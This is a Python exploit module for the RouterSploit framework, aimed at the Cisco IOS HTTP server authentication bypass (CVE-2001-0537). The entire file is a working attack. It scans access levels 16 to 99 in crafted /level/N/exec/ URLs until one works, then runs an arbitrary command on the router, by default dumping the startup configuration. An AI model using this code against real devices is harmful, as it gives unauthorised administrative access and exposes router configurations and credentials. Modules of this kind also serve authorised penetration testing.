import re

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    This exploit targets a vulnerability in the Cisco IOS HTTP Server.
    By sending a GET request for the url  "http://ip_address/level/{num}/exec/..",
    it is possible to bypass authentication and execute any command.
    Example: http://10.0.0.1/level/99/exec/show/startup/config
    """
    __info__ = {
        'name': 'Cisco IOS HTTP Unauthorized Administrative Access',
        'description': 'HTTP server for Cisco IOS 11.3 to 12.2 allows attackers '
                       'to bypass authentication and execute arbitrary commands, '
                       'when local authorization is being used, by specifying a high access level in the URL.',
        'authors': [
            'renos stoikos <rstoikos[at]gmail.com>'  # routesploit module
        ],
        'references': [
            'http://www.cvedetails.com/cve/cve-2001-0537',
        ],
        'devices': [
            ' IOS 11.3 -> 12.2 are reportedly vulnerable.',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    show_command = exploits.Option('show startup-config', 'Command to be executed e.g show startup-config')
    access_level = None

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}/level/{}/exec/-/{}".format(self.target, self.port, self.access_level, self.show_command)
            response = http_request(method="GET", url=url)
            if response is None:
                print_error("Could not execute command")  # target is not vulnerable
                return
            else:
                print_success("Exploit success! - executing command")
                print_info(re.sub('<[^<]+?>', '', response.text))
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for num in range(16, 100):
            url = "{}:{}/level/{}/exec/-/{}".format(self.target, self.port, num, self.show_command)
            response = http_request(method="GET", url=url)
            if response is None:  # target does not respond
                break

            if response.status_code == 200 and "Command was:  {}".format(self.show_command) in response.text:
                self.access_level = num
                return True  # target is vulnerable

        return False  # target is not vulnerable
